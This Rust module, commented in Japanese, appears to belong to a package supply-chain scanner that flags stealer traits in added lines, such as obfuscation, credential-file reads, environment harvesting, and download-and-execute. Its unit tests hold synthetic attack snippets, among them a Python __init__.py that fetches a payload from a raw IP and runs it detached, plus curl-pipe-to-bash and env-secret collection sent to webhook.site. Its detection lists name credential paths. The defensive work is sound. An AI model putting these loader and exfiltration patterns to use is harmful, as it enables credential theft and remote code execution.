//! テキスト共通の特徴：増えた行から、盗む処理によく出る形を拾う。
//!
//! 1 つの特徴だけでは決め手にならない（正規のライブラリにも出る）。点数は検知ルール側で付け、
//! 組み合わせ（「環境変数を集める」と「外へ送る」等）で重くする。

use super::Finding;
use base64::Engine;
use regex::Regex;
use std::collections::HashMap;
use std::sync::OnceLock;

/// 検知ルールのリスト（`detections/*.yaml` の lists から渡す）
#[derive(Debug, Clone, Copy)]
pub struct Lists<'a> {
    /// 盗んだ情報の置き場に使われやすいサービス（登録ドメイン）
    pub exfil: &'a [String],
    /// ブロックチェーンの公開 RPC（登録ドメイン）
    pub chain_rpc: &'a [String],
    /// ブロックチェーンの公開 RPC（ドメインの末尾。`.icp0.io` 等）
    pub chain_rpc_suffixes: &'a [String],
}

/// 1 ファイル・1 特徴あたりの所見の上限
const MAX_PER_FEATURE: usize = 5;

/// 調べる拡張子（拡張子なしも調べる）
const TEXT_EXTS: &[&str] = &[
    "py", "pyw", "js", "mjs", "cjs", "ts", "mts", "cts", "sh", "bash", "json", "yml", "yaml", "toml", "cfg", "txt",
    "pth",
];
/// 1 行の長さ・難読化を見るのはコードだけ
const CODE_EXTS: &[&str] = &["py", "pyw", "js", "mjs", "cjs", "ts", "mts", "cts", "sh", "bash", "pth"];

fn ext_of(path: &str) -> String {
    let name = path.rsplit('/').next().unwrap_or(path);
    match name.rsplit_once('.') {
        Some((stem, e)) if !stem.is_empty() => e.to_ascii_lowercase(),
        _ => String::new(),
    }
}

/// 説明・メタデータのファイル（コードではない。README の「~/.netrc を読む」等の説明で誤検知しないため）
const DOC_NAMES: &[&str] = &["METADATA", "PKG-INFO", "RECORD", "WHEEL", "INSTALLER", "REQUESTED"];
const DOC_PREFIXES: &[&str] = &[
    "README",
    "LICENSE",
    "LICENCE",
    "CHANGELOG",
    "CHANGES",
    "HISTORY",
    "NOTICE",
    "AUTHORS",
    "COPYING",
    "CONTRIBUTING",
    "SECURITY",
];

/// ブラウザで読む静的な配布物（Next.js の `_next/static/` 等）。Node・Python からは実行されない。
/// 画面のコード例（`curl …`）や環境変数の表示で誤検知するので見ない
const BROWSER_BUNDLE_DIRS: &[&str] =
    &["/_next/static/", "_next/static/", "/static/chunks/", "/static/js/", "/static/css/"];

/// このファイルを調べるか
pub fn is_scanned(path: &str) -> bool {
    if BROWSER_BUNDLE_DIRS.iter().any(|d| path.starts_with(d.trim_start_matches('/')) || path.contains(d)) {
        return false;
    }
    let name = path.rsplit('/').next().unwrap_or(path);
    let up = name.to_ascii_uppercase();
    if DOC_NAMES.contains(&up.as_str()) || DOC_PREFIXES.iter().any(|p| up.starts_with(p)) {
        return false;
    }
    let e = ext_of(path);
    e.is_empty() || TEXT_EXTS.contains(&e.as_str())
}

fn re_url() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| Regex::new(r#"(?i)\b(?:https?|wss?)://([A-Za-z0-9.\-]+|\[[0-9A-Fa-f:]+\])"#).unwrap())
}
fn re_b64() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| Regex::new(r"[A-Za-z0-9+/_\-]{20,4000}={0,2}").unwrap())
}
fn re_blob() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| Regex::new(r"[A-Za-z0-9+/=_\-]{200,}").unwrap())
}
fn re_pipe_sh() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| Regex::new(r"(?:^|[^|])\|\s*(?:sudo\s+)?(?:sh|bash|zsh|python3?|node|iex)\b").unwrap())
}
fn re_ws_hide() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| Regex::new(r"\S[ \t]{150,}\S").unwrap())
}
fn re_hf_token() -> &'static Regex {
    // `huggingface/tokenizers` を拾わない
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| Regex::new(r"huggingface/token(?:[^a-z0-9_]|$)").unwrap())
}

fn re_host() -> &'static Regex {
    // URL の形でなく、ホスト名だけが文字列で書かれている場合（`host = "eth.llamarpc.com"` 等）
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| Regex::new(r#"["'`]([A-Za-z0-9\-]+(?:\.[A-Za-z0-9\-]+)+)["'`/:]"#).unwrap())
}

/// シャノン・エントロピー（1 文字あたりのビット数）
pub fn shannon(s: &str) -> f64 {
    let mut m: HashMap<char, usize> = HashMap::new();
    let mut n = 0usize;
    for c in s.chars() {
        *m.entry(c).or_default() += 1;
        n += 1;
    }
    if n == 0 {
        return 0.0;
    }
    m.values()
        .map(|&k| {
            let p = k as f64 / n as f64;
            -p * p.log2()
        })
        .sum()
}

/// base64 らしい連続（20〜4,000 文字）をデコードし、文字列として読めたものを返す
pub fn decode_b64_runs(line: &str) -> Vec<String> {
    let mut out = vec![];
    for m in re_b64().find_iter(line).take(20) {
        let s = m.as_str();
        // 英字だけ・数字だけの並び（識別子・ハッシュ）は除く
        if !s.chars().any(|c| c.is_ascii_digit()) && !s.contains(['+', '/', '=']) {
            continue;
        }
        let t = s.trim_end_matches('=');
        for eng in
            [&base64::engine::general_purpose::STANDARD_NO_PAD, &base64::engine::general_purpose::URL_SAFE_NO_PAD]
        {
            if let Ok(b) = eng.decode(t) {
                if let Ok(txt) = String::from_utf8(b) {
                    if txt.chars().all(|c| !c.is_control() || c == '\n' || c == '\t') {
                        out.push(txt);
                        break;
                    }
                }
            }
        }
    }
    out
}

/// URL・文字列中のホスト名を取り出す（小文字）
fn hosts_in(s: &str) -> Vec<String> {
    let mut v: Vec<String> =
        re_url().captures_iter(s).map(|c| c[1].trim_end_matches('.').to_ascii_lowercase()).collect();
    v.extend(re_host().captures_iter(s).map(|c| c[1].to_ascii_lowercase()));
    v.sort();
    v.dedup();
    v
}

fn url_hosts(s: &str) -> Vec<String> {
    re_url().captures_iter(s).map(|c| c[1].trim_end_matches('.').to_ascii_lowercase()).collect()
}

fn in_list(host: &str, list: &[String]) -> bool {
    let rd = crate::dga::registered_domain(host).unwrap_or_else(|| host.to_string());
    list.iter().any(|x| x.eq_ignore_ascii_case(&rd) || x.eq_ignore_ascii_case(host))
}

fn has_suffix(host: &str, sfx: &[String]) -> bool {
    sfx.iter().any(|x| host.ends_with(&x.to_ascii_lowercase()))
}

/// インターネット上の IPv4（RFC 1918・ループバック・リンクローカル・0.0.0.0 は除く）
fn is_public_ipv4(host: &str) -> bool {
    match host.parse::<std::net::Ipv4Addr>() {
        Ok(ip) => !(ip.is_private() || ip.is_loopback() || ip.is_link_local() || ip.is_unspecified()),
        Err(_) => false,
    }
}

const CRED_PATHS: &[&str] = &[
    ".npmrc",
    ".git-credentials",
    ".netrc",
    ".aws/credentials",
    ".azure/",
    ".docker/config.json",
    ".ssh/id_",
    ".kube/config",
    ".config/gh/hosts.yml",
    ".pypirc",
    "gh auth token",
];

const OBF_CALLS: &[&str] = &[
    "eval(atob(",
    "eval(function(",
    "eval(buffer.from(",
    "function(atob(",
    "eval(string.fromcharcode",
    "exec(base64.",
    "exec(zlib.",
    "exec(marshal.",
    "exec(bytes.fromhex",
    "zlib.decompress(base64.",
    "marshal.loads(",
];

/// 1 ファイルの増えた行から特徴を取る
pub fn scan_lines(path: &str, lines: &[(usize, String)], lists: &Lists) -> Vec<Finding> {
    if !is_scanned(path) || lines.is_empty() {
        return vec![];
    }
    let ext = ext_of(path);
    let is_code = CODE_EXTS.contains(&ext.as_str()) || ext.is_empty();
    let minified = path.ends_with(".min.js") || path.ends_with(".min.mjs");
    let mut out: Vec<Finding> = vec![];
    let mut count: HashMap<&'static str, usize> = HashMap::new();
    let mut push = |out: &mut Vec<Finding>, f: &'static str, line: usize, ex: &str| {
        let c = count.entry(f).or_default();
        if *c < MAX_PER_FEATURE {
            *c += 1;
            out.push(Finding::new(f, path, Some(line), ex));
        }
    };

    // ファイル内で組み合わせて判定する特徴の材料（最初に見つかった行）
    let mut env_iter: Option<(usize, String)> = None;
    let mut env_key = false;
    let mut env_json: Option<(usize, String)> = None;
    let mut proc_dir: Option<(usize, String)> = None;
    let mut proc_environ = false;
    let mut fork: Option<(usize, String)> = None;
    let mut setsid = false;
    let mut detached: Option<(usize, String)> = None;
    let mut unref = false;
    let mut bin_fetch: Option<(usize, String)> = None;
    let mut chmod = false;
    // 取って（または復号して）書いて動かす：同じファイルの増えた行にそろったら
    let mut net_fetch: Option<(usize, String)> = None;
    let mut spawn: Option<(usize, String)> = None;
    let mut writes_tmp = false;
    let mut decodes = false;
    let mut writes_file = false;
    // 別名で読み込んだモジュール（`import subprocess as _s` → `_s.Popen(`）でも拾えるよう、
    // 「モジュールを読み込んだ」と「呼び出しの形」を分けて見る
    let mut fetch_mod = false;
    let mut fetch_call: Option<(usize, String)> = None;
    let mut spawn_mod = false;
    let mut spawn_call: Option<(usize, String)> = None;
    let is_init = {
        let name = path.rsplit('/').next().unwrap_or(path);
        name == "__init__.py"
    };

    for (n, line) in lines {
        let l = line.to_ascii_lowercase();
        let compact: String = l.chars().filter(|c| !c.is_whitespace()).collect();

        // 難読化。長い行だけでは出さない（生成されたコード・型定義に普通にある）
        if is_code && !minified {
            if let Some(m) = re_blob().find(line) {
                if shannon(m.as_str()) > 4.5 {
                    push(&mut out, "obfuscation", *n, &format!("長い符号化文字列（{} 文字）", m.as_str().len()));
                }
            }
        }
        // 行の右端の外へ、大量の空白で押し出したコード（エディタの画面では見えない）
        if is_code && re_ws_hide().is_match(line) {
            push(&mut out, "obfuscation", *n, "大量の空白の後ろに隠したコード");
        }
        // javascript-obfuscator 等の変数名（_0x1a2b）が大量に並ぶ
        if line.matches("_0x").count() >= 20 {
            push(&mut out, "obfuscation", *n, &format!("_0x… の名前が {} 個", line.matches("_0x").count()));
        }
        if OBF_CALLS.iter().any(|p| compact.contains(p)) || compact.contains("newfunction(atob(") {
            push(&mut out, "obfuscation", *n, line);
        }

        // 環境変数の収集
        if ["os.environ.items()", "os.environ.copy()", "dict(os.environ)", "os.environ.keys()"]
            .iter()
            .any(|p| compact.contains(p))
            || l.contains("in os.environ:")
            || ["object.keys(process.env)", "object.entries(process.env)", "...process.env}", "forkinprocess.env"]
                .iter()
                .any(|p| compact.contains(p))
        {
            env_iter.get_or_insert((*n, line.clone()));
        }
        if compact.contains("json.stringify(process.env)") || compact.contains("json.dumps(dict(os.environ))") {
            env_json.get_or_insert((*n, line.clone()));
        }
        if ["\"token\"", "'token'", "\"secret\"", "'secret'", "\"key\"", "'key'", "\"password\"", "'password'"]
            .iter()
            .any(|p| l.contains(p))
        {
            env_key = true;
        }
        if l.contains("/proc/") {
            proc_dir.get_or_insert((*n, line.clone()));
        }
        if (l.contains("environ") && !l.contains("os.environ")) || l.contains("/proc/*/environ") {
            proc_environ = true;
        }

        // 認証ファイル
        if CRED_PATHS.iter().any(|p| l.contains(p)) || re_hf_token().is_match(&l) {
            push(&mut out, "cred_paths", *n, line);
        }

        // 親から切り離す
        if compact.contains("os.fork(") {
            fork.get_or_insert((*n, line.clone()));
        }
        if compact.contains("os.setsid(") || compact.contains("start_new_session=true") {
            setsid = true;
        }
        if compact.contains("detached:true") {
            detached.get_or_insert((*n, line.clone()));
        }
        if compact.contains(".unref()") {
            unref = true;
        }
        if l.contains("nohup ") {
            push(&mut out, "detach", *n, line);
        }

        // 送り先
        for h in hosts_in(line) {
            if in_list(&h, lists.exfil) {
                push(&mut out, "exfil_host", *n, line);
            }
            if in_list(&h, lists.chain_rpc) || has_suffix(&h, lists.chain_rpc_suffixes) {
                push(&mut out, "chain_rpc", *n, line);
            }
        }
        for h in url_hosts(line) {
            if is_public_ipv4(&h) {
                push(&mut out, "raw_ip_url", *n, line);
            }
        }
        // base64 に隠した URL
        for dec in decode_b64_runs(line) {
            let dl = dec.to_ascii_lowercase();
            if dl.contains("http://") || dl.contains("https://") || dl.contains("wss://") {
                push(&mut out, "hidden_url", *n, &format!("{line} → {dec}"));
                for h in url_hosts(&dec) {
                    if in_list(&h, lists.exfil) {
                        push(&mut out, "exfil_host", *n, &format!("（デコード後）{dec}"));
                    }
                    if in_list(&h, lists.chain_rpc) || has_suffix(&h, lists.chain_rpc_suffixes) {
                        push(&mut out, "chain_rpc", *n, &format!("（デコード後）{dec}"));
                    }
                }
            }
        }

        // ダウンロードして実行
        // シェルでの取得 → そのまま実行（`curl … | sh`・`$(curl …)`）。復号して実行は obfuscation で拾う
        let fetch_cmd = ["curl ", "wget ", "invoke-webrequest", "iwr "].iter().any(|p| l.contains(p));
        // `||` の後ろ（JS の `a||shouldX` 等）を拾わないよう、パイプ 1 本と語の区切りで見る
        let pipe_sh = re_pipe_sh().is_match(&l);
        let subst = ["$(curl", "$(wget", "`curl", "`wget", "<(curl", "<(wget"].iter().any(|p| l.contains(p));
        if (fetch_cmd && pipe_sh) || subst {
            push(&mut out, "download_exec", *n, line);
        }
        if fetch_cmd
            && (l.contains("/releases/download/") || l.contains("bun.sh/install") || l.contains("deno.land/install"))
        {
            bin_fetch.get_or_insert((*n, line.clone()));
        }
        if l.contains("chmod") {
            chmod = true;
        }

        // コードの中からの取得・起動・書き込み（シェルを使わない形）
        if [
            "urllib.request.urlopen(",
            "urllib.request.urlretrieve(",
            "urlretrieve(",
            "urlopen(",
            "requests.get(",
            "requests.post(",
            "httpx.get(",
            "http.client.",
            "https.get(",
            "http.get(",
            "https.request(",
        ]
        .iter()
        .any(|p| compact.contains(p))
        {
            net_fetch.get_or_insert((*n, line.clone()));
        }
        if [
            "subprocess.popen(",
            "subprocess.run(",
            "subprocess.call(",
            "subprocess.check_output(",
            "os.system(",
            "os.popen(",
            "os.execv",
            "os.startfile(",
            "execsync(",
            "execfilesync(",
            "child_process').exec",
            "child_process\").exec",
            "spawnsync(",
        ]
        .iter()
        .any(|p| compact.contains(p))
            || (compact.contains("spawn(") && l.contains("child_process"))
        {
            spawn.get_or_insert((*n, line.clone()));
        }
        if l.contains("/tmp/")
            || compact.contains("tempfile.")
            || compact.contains("os.tmpdir()")
            || l.contains("%temp%")
        {
            writes_tmp = true;
        }
        if compact.contains("b64decode(") || compact.contains("'base64')") || compact.contains("\"base64\")") {
            decodes = true;
        }
        if compact.contains("open(")
            && (compact.contains("'wb'") || compact.contains("\"wb\"") || compact.contains("'w'"))
            || compact.contains("writefilesync(")
            || compact.contains("urlretrieve(")
        {
            writes_file = true;
        }
        if [
            "importurllib.request",
            "urllib.requestas",
            "fromurllib.requestimport",
            "importrequests",
            "importhttpx",
            "require('https')",
            "require(\"https\")",
            "require('http')",
            "require(\"http\")",
        ]
        .iter()
        .any(|p| compact.contains(p))
        {
            fetch_mod = true;
        }
        if [".urlretrieve(", ".urlopen(", "urlopen(", "urlretrieve(", "requests.get(", ".get(", ".request("]
            .iter()
            .any(|p| compact.contains(p))
        {
            fetch_call.get_or_insert((*n, line.clone()));
        }
        // 外部コマンドの curl・wget で取る（`subprocess.run(["curl", …, "-o", dest])` の形）
        if ["\"curl\"", "'curl'", "\"wget\"", "'wget'"].iter().any(|p| l.contains(p)) {
            net_fetch.get_or_insert((*n, line.clone()));
        }
        if ["importsubprocess", "subprocessas", "fromsubprocessimport", "child_process"]
            .iter()
            .any(|p| compact.contains(p))
        {
            spawn_mod = true;
        }
        if [".popen(", ".run(", ".call(", ".check_output(", ".check_call(", "popen(", "execsync(", ".exec(", ".spawn("]
            .iter()
            .any(|p| compact.contains(p))
        {
            spawn_call.get_or_insert((*n, line.clone()));
        }
        if compact.contains("start_new_session=true") && (spawn.is_some() || spawn_mod) {
            push(&mut out, "detach", *n, line);
        }

        // CI のシークレット
        if compact.contains("tojson(secrets)")
            || l.contains("actions_id_token_request")
            || l.contains("actions_runtime_token")
        {
            push(&mut out, "ci_secrets", *n, line);
        }
    }

    if let Some((n, l)) = env_json {
        push(&mut out, "env_harvest", n, &l);
    } else if let (Some((n, l)), true) = (&env_iter, env_key) {
        push(&mut out, "env_harvest", *n, l);
    }
    if let (Some((n, l)), true) = (&proc_dir, proc_environ) {
        push(&mut out, "env_harvest", *n, l);
    }
    if let (Some((n, l)), true) = (&fork, setsid) {
        push(&mut out, "detach", *n, l);
    }
    if let (Some((n, l)), true) = (&detached, unref) {
        push(&mut out, "detach", *n, l);
    }
    if let (Some((n, l)), true) = (&bin_fetch, chmod) {
        push(&mut out, "download_exec", *n, l);
    }
    let is_py = matches!(ext.as_str(), "py" | "pyw" | "pth");
    // 別名からの呼び出しで判定するのは Python だけ（JS の `.get(`・`.exec(` は普通の呼び出しに多すぎる）
    if net_fetch.is_none() && fetch_mod && is_py {
        net_fetch = fetch_call.clone();
    }
    if spawn.is_none() && spawn_mod && (is_py || spawn_call.as_ref().is_some_and(|(_, l)| l.contains("child_process")))
    {
        spawn = spawn_call.clone();
    }
    // 取って、置いて、動かす（2 段目の取得。2026 年の PyPI の乗っ取りで多い形）
    if let (Some((n, l)), Some(_), true) = (&net_fetch, &spawn, writes_tmp || writes_file) {
        push(&mut out, "download_exec", *n, l);
    }
    // 復号して、書いて、動かす（中身を base64 で隠した本体）
    if let (Some((n, l)), true, true) = (&spawn, decodes, writes_file || writes_tmp) {
        push(&mut out, "drop_exec", *n, l);
    }
    // パッケージの読み込み（import）だけで、取得や起動が走る
    if is_init {
        if let Some((n, l)) = spawn.as_ref().or(net_fetch.as_ref()) {
            push(&mut out, "import_time_exec", *n, l);
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn lists() -> (Vec<String>, Vec<String>, Vec<String>) {
        (
            vec!["webhook.site".into(), "pastebin.com".into()],
            vec!["llamarpc.com".into(), "getblock.io".into()],
            vec![".icp0.io".into()],
        )
    }
    fn run(path: &str, text: &str) -> Vec<String> {
        let (a, b, c) = lists();
        let l = Lists { exfil: &a, chain_rpc: &b, chain_rpc_suffixes: &c };
        let lines: Vec<(usize, String)> = text.lines().enumerate().map(|(i, s)| (i + 1, s.to_string())).collect();
        let mut v: Vec<String> = scan_lines(path, &lines, &l).into_iter().map(|f| f.feature).collect();
        v.sort();
        v.dedup();
        v
    }

    #[test]
    fn agent_framework_like() {
        // 2026-11 の agent-framework の手口をまねた合成の文字列（実物ではない。宛先は文字列として書くだけ）
        let t = r#"import os, base64, glob
def _collect():
    env = {k: v for k, v in os.environ.items() if any(s in k for s in ("TOKEN", "SECRET", "KEY"))}
    for p in glob.glob("/proc/*/environ"):
        pass
    files = glob.glob(os.path.expanduser("~/.azure/*.json"))
    u = base64.b64decode("aHR0cHM6Ly93ZWJob29rLnNpdGUvdGVzdA==").decode()
def _start():
    if os.fork() == 0:
        os.setsid()
        _collect()
"#;
        let f = run("af_meta/_telemetry.py", t);
        for want in ["cred_paths", "detach", "env_harvest", "exfil_host", "hidden_url"] {
            assert!(f.contains(&want.to_string()), "{want} が出ない: {f:?}");
        }
    }

    #[test]
    fn keyv_like() {
        let t = "const { execSync } = require('child_process');\n\
                 execSync('curl -fsSL https://github.com/x/y/releases/download/v1/bun -o /tmp/b && chmod +x /tmp/b');\n\
                 const rpc = 'https://eth.llamarpc.com';\n\
                 fetch(\"https://abc-cai.raw.icp0.io/\");\n";
        let f = run("setup.mjs", t);
        for want in ["chain_rpc", "download_exec"] {
            assert!(f.contains(&want.to_string()), "{want} が出ない: {f:?}");
        }
    }

    #[test]
    fn raw_ip_and_obf() {
        assert_eq!(run("a.js", "fetch('http://198.51.100.7/x')"), vec!["raw_ip_url"]);
        assert!(run("a.js", "fetch('http://192.168.0.1/')\nfetch('http://127.0.0.1:8080/')").is_empty());
        assert_eq!(run("a.js", "eval(atob(x))"), vec!["obfuscation"]);
        let blob: String = (0..300).map(|i| char::from(b"Zq9xR2mL0aB7vK1pW4cT8nY3uE6sH5dJ"[i % 32])).collect();
        assert_eq!(run("a.py", &format!("p = '{blob}'")), vec!["obfuscation"]);
        assert!(run("a.min.js", &"x".repeat(6000)).is_empty());
        // 長い行だけでは出さない
        assert!(run("a.js", &"x;".repeat(3000)).is_empty());
        assert_eq!(run("a.js", &"var _0xab=1;".repeat(25)), vec!["obfuscation"]);
        // 圧縮された JS にある "http" や "|" の並びは、ダウンロード実行ではない
        assert!(run("a.js", "var u=\"https://x\"+a|node.b;eval(c)").is_empty());
    }

    #[test]
    fn benign() {
        let t = "import os\nhome = os.environ.get('HOME')\nurl = 'https://pypi.org/simple/'\nh = 'sha256:3f9a'\n";
        assert!(run("pkg/util.py", t).is_empty(), "{:?}", run("pkg/util.py", t));
        assert!(run("README.md", "Put your token in ~/.npmrc").is_empty());
        assert!(run("pkg-1.0.dist-info/METADATA", "Automatic honoring of `.netrc`").is_empty());
        assert!(run("LICENSE", "see https://webhook.site").is_empty());
        assert!(run("a.py", "x = 'dGVzdA=='").is_empty());
        // 環境変数を回すだけ（キーの絞り込みなし）は出さない
        assert!(run("a.py", "for k in os.environ:\n    print(k)").is_empty());
        // CI の設定に secrets を渡すだけ
        assert!(run("x.yml", "env:\n  T: ${{ secrets.T }}").is_empty());
    }

    #[test]
    fn python_stage2_loader() {
        // 2026 年の PyPI の乗っ取り（__init__.py に足された 2 段目の取得）をまねた合成の文字列。宛先は文字列として書くだけ
        let t = "import os, subprocess, urllib.request\n\
                 if os.name == 'posix':\n\
                 \x20   urllib.request.urlretrieve('https://203.0.113.9/x.pyz', '/tmp/x.pyz')\n\
                 \x20   subprocess.Popen(['python3', '/tmp/x.pyz'], start_new_session=True)\n";
        let f = run("pkg/__init__.py", t);
        for want in ["detach", "download_exec", "import_time_exec", "raw_ip_url"] {
            assert!(f.contains(&want.to_string()), "{want} が出ない: {f:?}");
        }
        // 同じ形でも __init__.py でなければ import_time_exec は出ない
        assert!(!run("pkg/tools.py", t).contains(&"import_time_exec".to_string()));
        // 復号して書いて動かす
        let d = "import base64, subprocess, tempfile\nb = 'eA=='\nopen(p, 'wb').write(base64.b64decode(b))\nsubprocess.run([sys.executable, p])\n";
        assert!(run("pkg/server.py", d).contains(&"drop_exec".to_string()));
        // 別名で読み込んでも拾う
        let a = "import subprocess as _sub, urllib.request as _u, os as _os\n\
                 _dest = '/tmp/t.pyz'\n\
                 _u.urlretrieve(_url, _dest)\n\
                 _sub.Popen(['python3', _dest])\n";
        assert!(
            run("m/client/__init__.py", a).contains(&"download_exec".to_string()),
            "{:?}",
            run("m/client/__init__.py", a)
        );
        // 外部コマンドの curl で取る
        let c = "import subprocess as _s\n_s.run(['curl', '-s', u, '-o', '/tmp/a.pyz'])\n_s.Popen([sys.executable, '/tmp/a.pyz'])\n";
        assert!(run("m/__init__.py", c).contains(&"download_exec".to_string()));
        // 取得だけ・起動だけでは出ない
        assert!(run("pkg/net.py", "import requests\nr = requests.get(url)\n").is_empty());
        assert!(run("pkg/cli.py", "import subprocess\nsubprocess.run(['git', 'status'])\n").is_empty());
    }

    #[test]
    fn whitespace_hiding() {
        let l = format!("var a = require('./x');{}eval(atob(p))", " ".repeat(200));
        assert!(run("lib/index.js", &l).contains(&"obfuscation".to_string()));
        assert!(run("lib/index.js", &format!("var a = 1;{}", " ".repeat(300))).is_empty());
    }

    #[test]
    fn bundles_and_lookalikes() {
        // ブラウザ向けの配布物は見ない
        assert!(run("pkg/proxy/out/_next/static/chunks/a.js", "curl -s https://x | sh").is_empty());
        // `||sh…` はシェルへのパイプではない
        assert!(run("a.js", "if(a||shouldRun){curl_cmd='curl -X POST x'}").is_empty());
        assert!(run("a.sh", "curl -fsSL https://x/i.sh | bash").contains(&"download_exec".to_string()));
        // huggingface/tokenizers は認証ファイルではない
        assert!(run("sbom.json", r#""url": "https://github.com/huggingface/tokenizers""#).is_empty());
        assert!(run("a.py", "p = '~/.cache/huggingface/token'").contains(&"cred_paths".to_string()));
        // JS の普通の .get( と .exec(（正規表現）だけでは取得・起動にしない
        assert!(run("a.js", "const m = re.exec(s); http.get(u); fs.writeFileSync('/tmp/x', d)").is_empty());
    }

    #[test]
    fn ci_and_json_env() {
        assert_eq!(run("w.yml", "run: echo '${{ toJSON(secrets) }}'"), vec!["ci_secrets"]);
        assert_eq!(run("i.js", "post(JSON.stringify(process.env))"), vec!["env_harvest"]);
        assert_eq!(run("i.js", "spawn(n, a, { detached: true }).unref()"), vec!["detach"]);
    }

    #[test]
    fn long_line_is_fast() {
        let long = format!("var a = '{}';", "ab+/".repeat(50_000));
        let lines = vec![(
            1usize,
            crate::inspect::diff::added_lines(&crate::inspect::FileDiff {
                path: "x.js".into(),
                change: crate::inspect::Change::Added,
                old: None,
                new: Some(long.into_bytes()),
            })[0]
                .1
                .clone(),
        )];
        let (a, b, c) = lists();
        let t = std::time::Instant::now();
        let _ = scan_lines("x.js", &lines, &Lists { exfil: &a, chain_rpc: &b, chain_rpc_suffixes: &c });
        assert!(t.elapsed().as_secs_f64() < 2.0, "{:?}", t.elapsed());
    }
}
